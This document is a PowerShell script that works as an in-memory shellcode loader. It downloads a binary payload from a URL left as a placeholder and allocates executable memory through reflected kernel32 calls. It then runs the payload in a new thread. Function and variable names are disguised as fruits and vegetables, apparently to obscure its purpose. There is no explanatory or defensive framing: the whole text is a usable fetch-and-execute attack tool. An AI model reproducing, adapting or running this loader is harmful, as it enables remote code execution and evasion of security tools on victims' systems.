function potatoes {
    Param ($cherries, $pineapple)
    $systemDll = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $tomatoes = $systemDll.GetType('Microsoft.Win32.UnsafeNativeMethods')
    
    $turnips = @()
    $tomatoes.GetMethods([System.Reflection.BindingFlags]'Public,Static,NonPublic') | ForEach-Object {
        If ($_.Name -eq "GetProcAddress") {
            $turnips += $_
        }
    }
    
    $moduleHandle = ($tomatoes.GetMethod('GetModuleHandle')).Invoke($null, @($cherries))
    return $turnips[0].Invoke($null, @($moduleHandle, $pineapple))
}

function apples {
    Param (
        [Parameter(Position = 0, Mandatory = {$true})] [Type[]] $funcParams,
        [Parameter(Position = 1)] [Type] $delReturnType = [Void]
    )
    
    $assemblyName = New-Object System.Reflection.AssemblyName('ReflectedDelegateAssembly')
    $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($assemblyName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    
    $delegateTypeBuilder = $moduleBuilder.DefineType(
        'MyDynamicDelegate', 
        [System.Reflection.TypeAttributes]'Class, Public, Sealed, AnsiClass, AutoClass', 
        [System.MulticastDelegate]
    )
    
    $constructorBuilder = $delegateTypeBuilder.DefineConstructor(
        [System.Reflection.MethodAttributes]'RTSpecialName, HideBySig, Public', 
        [System.Reflection.CallingConventions]::Standard, 
        $funcParams
    )
    $constructorBuilder.SetImplementationFlags([System.Reflection.MethodImplAttributes]'Runtime, Managed')
    
    $invokeMethodBuilder = $delegateTypeBuilder.DefineMethod(
        'Invoke', 
        [System.Reflection.MethodAttributes]'Public, HideBySig, NewSlot, Virtual', 
        $delReturnType,
        $funcParams
    )
    $invokeMethodBuilder.SetImplementationFlags([System.Reflection.MethodImplAttributes]'Runtime, Managed')
    
    return $delegateTypeBuilder.CreateType()
}

$url = ".bin url goes here"
try {
    [Byte[]] $buf = [System.Net.WebClient]::new().DownloadData($url)
} catch {
    Write-Error "Failed to download from $url. Error: $($_.Exception.Message)"
    exit 1
}

$virtualAllocPtr = potatoes kernel32.dll VirtualAlloc
$virtualAllocDelegateType = apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$virtualAllocDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($virtualAllocPtr, $virtualAllocDelegateType)
$cucumbers = $virtualAllocDelegate.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $cucumbers, $buf.Length)

$createThreadPtr = potatoes kernel32.dll CreateThread
$createThreadDelegateType = apples @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$createThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($createThreadPtr, $createThreadDelegateType)
$parsnips = $createThreadDelegate.Invoke([IntPtr]::Zero, 0, $cucumbers, [IntPtr]::Zero, 0, [IntPtr]::Zero)

$waitForSingleObjectPtr = potatoes kernel32.dll WaitForSingleObject
$waitForSingleObjectDelegateType = apples @([IntPtr], [Int32]) ([Int32])
$waitForSingleObjectDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($waitForSingleObjectPtr, $waitForSingleObjectDelegateType)
$waitResult = $waitForSingleObjectDelegate.Invoke($parsnips, 0xFFFFFFFF)
